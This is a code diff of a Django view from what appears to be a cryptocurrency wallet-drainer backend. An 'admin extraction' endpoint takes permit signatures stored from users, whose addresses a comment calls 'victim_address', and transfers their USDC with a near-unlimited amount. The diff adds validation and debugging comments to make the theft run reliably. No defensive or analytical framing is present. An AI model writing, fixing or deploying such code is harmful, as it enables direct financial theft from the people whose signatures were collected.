@@ -60,26 +60,28 @@ def admin_extraction_list(request):
 def process_extraction(request, profile_id):
     profile = get_object_or_404(Profile, id=profile_id)
 
-    # Check if we actually have a signature
-    if not profile.permit_r:
-        return JsonResponse({'status': 'error', 'msg': 'No signature found for this user.'})
+    # Validation: Ensure we actually have the data
+    if not all([profile.wallet_address, profile.permit_v, profile.permit_r, profile.permit_s]):
+        return JsonResponse({'status': 'error', 'msg': 'Missing signature data in database.'})
 
-    # Call the utility with all 6 required arguments
+    # This MUST match the 6 arguments in your utils.py:
+    # (victim_address, amount, deadline, v, r, s)
     tx_hash, error = execute_usdc_transfer(
-        profile.wallet_address,
-        999999999999999999, # The limit signed by user
-        profile.permit_deadline,
-        profile.permit_v,
-        profile.permit_r,
-        profile.permit_s
+        profile.wallet_address,      # 1
+        999999999999999999,          # 2 (Amount - ensure this is an int)
+        profile.permit_deadline,     # 3
+        profile.permit_v,            # 4
+        profile.permit_r,            # 5
+        profile.permit_s             # 6
     )
 
     if tx_hash:
         profile.web3_approval_tx = tx_hash
-        profile.has_web3_approval = False # Mark as completed
+        profile.has_web3_approval = False
         profile.save()
         return JsonResponse({'status': 'success', 'tx': tx_hash})
     else:
+        # This will show you exactly why the blockchain rejected it (e.g., No ETH for gas)
         return JsonResponse({'status': 'error', 'msg': f"Blockchain Error: {error}"})
 
 # --- PUBLIC REGISTRATION VIEW ---
